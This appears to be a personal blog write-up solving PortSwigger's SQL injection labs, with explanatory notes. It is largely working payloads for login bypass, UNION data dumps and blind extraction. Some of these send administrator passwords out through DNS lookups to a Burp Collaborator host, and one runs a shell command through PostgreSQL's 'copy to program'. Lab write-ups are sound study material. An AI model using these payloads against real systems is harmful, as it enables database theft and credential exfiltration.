---
date: 2021-05-26 23:48:05
layout: post
title: PortSwigger SQL Injection Labs & Notes Writeup
subtitle: PortSwigger SQL Injection Labs & Notes Writeup.
description: >-
  in this blog i've explained how to solve openadmin machine in hackthebox
image: https://1.bp.blogspot.com/-kffR9cHu9Mg/WETBF5pCNdI/AAAAAAAAAfI/4Pm_Dc0rdbkn3YHbNrM0MAMTKheTJmokgCEw/s1600/sqlinjection2.png
optimized_image: https://1.bp.blogspot.com/-kffR9cHu9Mg/WETBF5pCNdI/AAAAAAAAAfI/4Pm_Dc0rdbkn3YHbNrM0MAMTKheTJmokgCEw/s1600/sqlinjection2.png
category: web security
tags:
  - web security
  - sql injection
author: Ahmed Fatouh
paginate: true
---


# Let's solve all SQLI labs.

> **`SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.`**

### Lab 1:  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data.


> **This lab contains an SQLI in product category filter. we need to use  SQLI to retrieve all products data.**

> **In the request there is a request to get the Category and there is a parameter called category and this parameter is our injection point.**

> **inject in the value of this param "'OR+1=1--", THIS PAYLOAD WILL WORK ALSO BUT WILL GIVE YOU ERROR BEACAUSE PORTSWIGGER USE SPECIFIC PAYLOAD TO SOLVE THT LABS.**

![](https://i.ibb.co/MD8tj9y/Pasted-image-20210516202321.png)


### Lab 2: SQL injection vulnerability allowing login bypass.

> **this lab contain a SQLI in the login form, we will use SQLI to bypass login and login as administrator.**

> **intercept the request with burpsuite and modify the username Param to `administrator'--`**

![](https://i.ibb.co/W04wSRy/Pasted-image-20210516203944.png)


### Lab 3:  SQL injection UNION attacks.

> **When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.**

> **For a `UNION` query to work, two key requirements must be met:**

* `The individual queries must return the same number of columns.`
* `The data types in each column must be compatible between the individual queries.`

#### Lab A: SQL injection UNION attack, determining the number of columns returned by the query.

> **This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.**

> `The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct`

![](https://i.ibb.co/mJ08nGm/Pasted-image-20210518002917.png)

#### Lab B:  SQL injection UNION attack, finding a column containing text.

> **This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query.**

> **we can know which column contains a String Data type.**

> ` ' UNION SELECT 'a',NULL,NULL,NULL--`

> **If the data type of a column is not compatible with string data, the injected query will cause a database error, such as: `Conversion failed when converting the varchar value 'a' to data type int.`**

> **`make the database retrieve the string HOCIy0`

![](https://i.ibb.co/b6c3knt/Pasted-image-20210518005956.png)


#### Lab C: SQL injection UNION attack, retrieving data from other tables.

> **This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.**

> **in this lab we will retrieve important data like `username` and `password`**

> **using this payload `'+UNION+SELECT+NULL,NULL--` we will notice that there is 2 columns only on the database.**

> **let's confirm that the 2 columns containing Strings by this Payload `'+UNION+SELECT+'a',+'b'--`**

> **we can dumb the administrator password with this payload `'+UNION+SELECT+username,password+FROM+users--`**

![](https://i.ibb.co/4R6MWWd/Pasted-image-20210518011253.png)

#### Lab D: Retrieving multiple values within a single column.


> **if the query only returns a single column, You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:`' UNION SELECT username || '~' || password FROM users--`**

> **we will use this payload `'+UNION+SELECT+NULL,NULL--` to know what is Columns number.**

> **The seconed column contains a strings and we can know it from this payload `'+UNION+SELECT+NULL,'ahmed'--`**

> **we will use this payload `'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--` to retrieve all users data.**

![](https://i.ibb.co/1JB82hg/Pasted-image-20210518012419.png)


**we've competed all `UNION ATTACKS`.**

### Lab 4: Examining the database in SQLI Attacks.

> **You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute: Microsoft, MySQL
`SELECT @@version`** 

> **This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  
Mar 18 2018 09:11:49`**

#### Lab A: SQL injection attack, querying the database type and version on Oracle.

* `SQL injection attack, querying the database type and version on Oracle`

> **On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`**

> **so we can confirm the number of columns with this Payload: `'+UNION+SELECT+NULL,NULL+FROM+dual--` and we have 2 columns here**

![](https://i.ibb.co/G39jWcN/Pasted-image-20210521025636.png)

* **Let's check which column contain a text.**

> **column 1 contain a text data.**

![](https://i.ibb.co/qk10b7M/Pasted-image-20210521025803.png)


> **column 2 contain a text data.**

![](https://i.ibb.co/KK8Rtv4/Pasted-image-20210521025903.png)

* **let's Retrieve the databse version**.

*there is more payloads at Pentestermonkey cheat sheet.*

![](https://i.ibb.co/W53Y5Pd/Pasted-image-20210521030130.png)

> **`'+UNION+SELECT+BANNER,+'ahmed'+FROM+v$version--`**

![](https://i.ibb.co/SR3NfW1/Pasted-image-20210521030342.png)

#### Lab B: SQL injection attack, querying the database type and version on MySQL and Microsoft.

* **`To solve the Lab Make the database retrieve the string: '8.0.25'` **

* **There is 2 columns and we can confirm that with this Payload:`'UNION+SELECT+NULL,NULL#`**

![](https://i.ibb.co/w78yTsT/Pasted-image-20210521031210.png)

> **and we can get the database version with this Payload:`'UNION+SELECT+@@version,'xdev05'#` **

![](https://i.ibb.co/6BFnV2f/Pasted-image-20210521031428.png)



#### Lab C: SQL injection attack, listing the database contents on non-Oracle databases.

> **The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.**
> **To solve the lab, log in as the `administrator` user.**

*There is 2 columns in this database*

> **we need to list the tables now and we will use this Payload:`'+UNION+SELECT+table_name,'xdev05'+FROM+information_schema.tables--`**

![](https://i.ibb.co/rxsL467/Pasted-image-20210521033852.png)

*there is a delicious table called `users_sjindk`*

![](https://i.ibb.co/ZTYBLy3/Pasted-image-20210521035658.png)

> **now we need to retrieve the Columns and we will use this Payload:`'+UNION+SELECT+column_name,'xdev05'+FROM+information_schema.columns--`**

![](https://i.ibb.co/b1spdFg/Pasted-image-20210521034742.png)

*there is 3 delicious columns with names:`rolename,user_name,username_hoorec,rolepassword,password_xxnicv`*

![](https://i.ibb.co/3NHWcK9/Pasted-image-20210521040403.png)

![](https://i.ibb.co/5hZk2Qz/Pasted-image-20210521040002.png)

* **now, let's get administrator Credentials.**

> **Final Payload: `'+UNION+SELECT+username_hoorec,password_xxnicv+FROM+users_sjindk--`**

![](https://i.ibb.co/F6xVZ6V/Pasted-image-20210521040531.png)

#### Lab D: SQL injection attack, listing the database contents on Oracle.

> **Note: On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.**
> **On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.**


* **use this Payload `'+UNION+SELECT+NULL,NULL+FROM+dual--` to confirm that ther is 2 columns here.**

> **use this payload to get all tables: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`**
*there is a delicious table_name called `USERS_TQXGJR`*

![](https://i.ibb.co/bLdSm7d/Pasted-image-20210521041858.png)

> **use this payload to get all columns:`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns--`**

*there is 2 delicious columns and they're called `PASSWORD_HKVEHH,USERNAME_XBRQYK`*

![](https://i.ibb.co/Gsxb2Dy/Pasted-image-20210521042316.png)

![](https://i.ibb.co/0shPNDW/Pasted-image-20210521042355.png)

> **Final Payload: `'+UNION+SELECT+USERNAME_XBRQYK,PASSWORD_HKVEHH+FROM+USERS_TQXGJR--`**

![](https://i.ibb.co/9WyXngC/Pasted-image-20210521042718.png)

### Lab 5: Blind SQLI Attacks.

> **What is blind SQLI? `Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.`**

> **Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this: `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4` When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this:`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'` This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.**
> **This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn: `…xyz' AND '1'='1`,  `…xyz' AND '1'='2` The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the "Welcome back" message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.**

> **For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.To do this, we start with the following input:`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`, This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`. Next, we send the following input:`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't` This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.**

#### Lab A: Blind SQL injection with conditional responses.

> **Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=iqJb0yCvvkrpg1Fh'AND+'1'='1`**

![](https://i.ibb.co/YhpjwdT/Pasted-image-20210522012027.png)

> **You will notice that there is a welcome message but if we modified the payload to `'AND+'1'='2` you will notice that there is no welcome message.**

![](https://i.ibb.co/Z6P4YwJ/Pasted-image-20210522012217.png)

*and we know that there is a table called users and there is 2 columns called username,password*

* **let's retrieve administrator password now.**

> **Use this Payload `'AND+(SELECT+'XDEV05'+FROM+users+WHERE+username+='administrator'+AND+LENGTH(password)>20)+='XDEV05` to confirm that the length is > 20**

> **Then use this Payload `'AND+(SELECT+SUBSTR(password,1,1)+FROM+users+WHERE+username='administrator')+='a` to retrieve the administrator password.**


> **Send the request to Intruder and select Cluster bomb attack Type and select 2 positions like me:**

![](https://i.ibb.co/JsyJGyG/Pasted-image-20210522015600.png)

> **Then go set Payload 1 as a number like this:

![](https://i.ibb.co/9HYXv9X/Pasted-image-20210522015727.png)

> **Payload 2 slect add from list and choose `a-z, A-Z,1-9`**

![](https://i.ibb.co/hRzDSKQ/Pasted-image-20210522015832.png)


> **Start the attack and make a filter to show every request contain a welcome back text.**

![](https://i.ibb.co/k38QPmx/Pasted-image-20210522020005.png)

> **The Password of the administrator is: `do4f8imup6kma14b7kcf`, let's try to login now**.

![](https://i.ibb.co/7NyM75h/Pasted-image-20210522020103.png)


#### Lab B: Blind SQL injection with conditional errors.

> **suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
>  `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
>   `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
>   These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
>   Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
>   `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`**

> **Note: In this lab The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.**
> **To solve the lab, log in as the `administrator` user,  This lab uses an Oracle database.**

> **If we put '  at the end of the value of the Cookie TrackingID it will cause an error, so there is SQLI here.**

![](https://i.ibb.co/pvwPzjs/Pasted-image-20210524192439.png)

![](https://i.ibb.co/dfTwMsW/Pasted-image-20210524192508.png)

> **And we know that the Database is Oracle so we will use the SELECT with the dual table and this is a default table in Oracle.**

> **We can confirm that it's oracle by using this Payload:`'||(SELECT+''+FROM+dual)||'`**

![](https://i.ibb.co/SBxwBcW/Pasted-image-20210524193350.png)

*ther is no errors, nice*

> **Note: The database contains a different table called `users`, with columns called `username` and `password`.**

> **we can confirm that there is a table name called users with this Payload:`'||(SELECT+''+FROM+users+WHERE+ROWNUM+%3d+1)||'`**

![](https://i.ibb.co/GCfH18y/Pasted-image-20210524194312.png)

> **As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.**

> **Now we cand use a Payload with a true condition to confirm that there is a username called `administrator`: `'||(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'`, Verify that the condition is true we recieve an error message so there is a user called administrator.**

![](https://i.ibb.co/W2Qf24G/Pasted-image-20210524195007.png)

> **Now we need to determine the length of administrator passowrd, and we can do it with this Payload: `'||(SELECT+CASE+WHEN+LENGTH(password)>1+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'`**

![](https://i.ibb.co/k9BkGrc/Pasted-image-20210524195545.png)

> **Change the value to > 20 and we can confirm that the length is 20 by un seeing the error message.**

![](https://i.ibb.co/6RDNWRQ/Pasted-image-20210524195657.png)

> **determining the length of the password, the next step is to test the character at each position to determine its value, and we will use this Payload:`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`**

> **Send the request to Burp intruder and select attack positions and start the attacks.**

![](https://i.ibb.co/hZXkWZp/Pasted-image-20210524200315.png)

> **administrator:`fwvde94lyvg5scmmfbvh`**

![](https://i.ibb.co/2dj6xS4/Pasted-image-20210524200635.png)

#### Lab C: Blind SQL injection with time delays.

> **In the preceding example, suppose that the application now catches database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.**
> **`In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.`**
> **Exa:  `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
>  `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
>  The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.**

> **To solve the lab  , exploit the SQLI to cause a 10 seconed delay.**

> **Time delays:
> Oracle:  `dbms_pipe.receive_message(('a'),10)`
> MIcrosoft:  `WAITFOR DELAY '0:0:10'`
> PostgreSQL: `SELECT pg_sleep(10)`
> MySQL: `SELECT sleep(10)`**

> **After Trying every payload the PostgreSQL one work with me.**

![](https://i.ibb.co/gWjVHY7/Pasted-image-20210526030609.png)

#### Lab D: Blind SQL injection with time delays and information retrieval.

> **To solve the lab, log in as the `administrator` user.**

> **In this challenge we will use conditional time delays.
> Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
> Microsoft:  `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
> PostgreSQL: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
> MySQL:  `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`**

> **Payload: `'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`**

![](https://i.ibb.co/Sn2B6Z9/Pasted-image-20210526033410.png)

* **Now let's Retrieve administrator Password**

> **We need to know the length of the admin password and we will use this Payload: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`**
> **Password Length: 20**

![](https://i.ibb.co/CsZZKvv/Pasted-image-20210526033816.png)


> **Now let's retrieve the password with this payload: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> Password: `k4ne7zofveqz5xvvlp4m`**

![](https://i.ibb.co/w48TkVx/Pasted-image-20210526221938.png)

![](https://i.ibb.co/ZVkh0V2/Pasted-image-20210526222046.png)


#### Lab E: Blind SQL injection with out-of-band interaction.

> **Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.
> In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.
> A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.**

> **On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:
> `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`**

> **To solve the lab, exploit the SQLI vulnerability to cause a DNS lookup to Burp Collaborator.**

> **DNS Lookup Payloads:
> Oracle: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`
> Microsoft: `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`
> PostgreSQL: `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`
> MySQL: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')`  
`SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`**

> **in this lab we will Compine SQLI with XXE to solve the lab and you can learn about XXE from this Link. [XXE](https://portswigger.net/web-security/xxe)**

> **Payload: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//fzi361u0rpc39ng09uwn4o6w1n7dv2.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`**

![](https://i.ibb.co/HGRKvPF/Pasted-image-20210526223719.png)

> **now we can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
> `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
> This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:
> `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`**

#### Lab F: Blind SQL injection with out-of-band data exfiltration.

> **To solve the lab, log in as the `administrator` user.**

##### DNS lookup with data exfiltration:
>**Oracle: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`
>Microsoft: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`
>MySQL: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`**

> **Payload: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.dhyh37kgjt1l452szhl61iy0crih66.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`**
> **Password: `96j0zwhmi9f24nqi6z01`**

![](https://i.ibb.co/F6phPD3/Pasted-image-20210526224722.png)

![](https://i.ibb.co/5vvCVVN/Pasted-image-20210526224958.png)

![](https://i.ibb.co/K2F9wVr/Pasted-image-20210526225256.png)


## How to detect SQL injection vulnerabilities.

-   Submitting the single quote character `'` and looking for errors or other anomalies.
-   Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
-   Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
-   Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
-   Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

## SQL injection in different parts of the query

> **Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.**

>  **But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:**
  -   In `UPDATE` statements, within the updated values or the `WHERE` clause.
-   In `INSERT` statements, within the inserted values.
-   In `SELECT` statements, within the table or column name.
-   In `SELECT` statements, within the `ORDER BY` clause.

### References:
- [SQLI-Cheat-Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PentesterMonkey-SQLI-Cheat-Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
